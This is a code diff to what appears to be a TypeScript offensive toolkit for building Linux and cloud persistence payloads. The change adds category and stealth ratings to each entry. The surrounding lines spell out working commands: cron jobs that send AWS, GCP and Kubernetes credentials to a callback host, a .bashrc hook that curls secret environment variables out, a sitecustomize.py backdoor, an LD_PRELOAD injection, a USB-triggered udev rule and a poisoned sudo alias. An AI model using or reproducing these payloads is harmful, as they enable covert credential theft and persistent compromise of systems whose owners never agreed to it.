@@ -659,6 +659,8 @@ export function buildCloudPersistence(cbHost: string, cbPort: string): Persisten
   const base = `http://${cbHost}:${cbPort}`;
   return [
     {
+      category:  "linux",
+      stealth:   3,
       technique: "AWS IMDS credential poller",
       command: [
         "(crontab -l 2>/dev/null;",
@@ -670,6 +672,8 @@ export function buildCloudPersistence(cbHost: string, cbPort: string): Persisten
       notes: "Exfiltrates fresh AWS IAM role credentials every 10 min via cron.",
     },
     {
+      category:  "linux",
+      stealth:   3,
       technique: "GCP metadata token poller",
       command: [
         "(crontab -l 2>/dev/null;",
@@ -681,6 +685,8 @@ export function buildCloudPersistence(cbHost: string, cbPort: string): Persisten
       notes: "Polls GCP OAuth token every 15 min and exfiltrates encoded.",
     },
     {
+      category:  "linux",
+      stealth:   3,
       technique: "K8s service account token exfil",
       command: [
         "(crontab -l 2>/dev/null;",
@@ -691,6 +697,8 @@ export function buildCloudPersistence(cbHost: string, cbPort: string): Persisten
       notes: "Exfiltrates K8s service account JWT every 5 min for API pivot.",
     },
     {
+      category:  "linux",
+      stealth:   3,
       technique: "Docker socket enumerate",
       command: [
         "(crontab -l 2>/dev/null;",
@@ -702,6 +710,8 @@ export function buildCloudPersistence(cbHost: string, cbPort: string): Persisten
       notes: "Enumerates running containers via Docker socket every 30 min.",
     },
     {
+      category:  "linux",
+      stealth:   3,
       technique: "Secret ENV dump on bash login",
       command: `echo 'env | grep -iE "AWS_|GOOGLE_|SECRET|TOKEN|KEY|PASS" 2>/dev/null | base64 -w0 | xargs -I{} curl -sk "${base}/env?d={}" 2>/dev/null &' >> ~/.bashrc`,
       notes: "Exfiltrates secret env vars silently on every bash login.",
@@ -713,21 +723,29 @@ export function buildCloudPersistence(cbHost: string, cbPort: string): Persisten
 export function buildStealthPersistence(safeCmd: string): PersistencePayload[] {
   return [
     {
+      category:  "linux",
+      stealth:   4,
       technique: "Python sitecustomize.py backdoor",
       command: `python3 -c "import site; p=site.getsitepackages()[0]+'/sitecustomize.py'; open(p,'a').write('\\nimport os\\nos.system(\\"${safeCmd} &\\")\\n')" 2>/dev/null`,
       notes: "Executes on every Python process start. Survives reboots if Python is used regularly.",
     },
     {
+      category:  "linux",
+      stealth:   4,
       technique: "LD_PRELOAD .so drop (root or user-level)",
       command: `printf '#include<unistd.h>\\nvoid __attribute__((constructor)) _i(){system("${safeCmd} &");}' > /tmp/.sl.c && gcc -shared -fPIC /tmp/.sl.c -o /tmp/.sl.so 2>/dev/null && echo /tmp/.sl.so >> /etc/ld.so.preload 2>/dev/null; rm -f /tmp/.sl.c`,
       notes: "Injects into every dynamically-linked binary. Requires /etc/ld.so.preload write (root).",
     },
     {
+      category:  "linux",
+      stealth:   4,
       technique: "Udev rule on USB insert",
       command: `echo 'ACTION==\"add\", SUBSYSTEM==\"usb\", RUN+=\"${safeCmd}\"' > /etc/udev/rules.d/99-nx.rules 2>/dev/null && udevadm control --reload-rules 2>/dev/null`,
       notes: "Triggers on any USB insertion. No cron, no login hook — extremely stealthy.",
     },
     {
+      category:  "linux",
+      stealth:   4,
       technique: "Alias poisoning in .bashrc",
       command: `echo 'alias sudo="bash -c \\"${safeCmd} >/dev/null 2>&1; exec sudo $*\\" --"' >> ~/.bashrc`,
       notes: "Wraps sudo — command runs silently before real sudo on every invocation.",
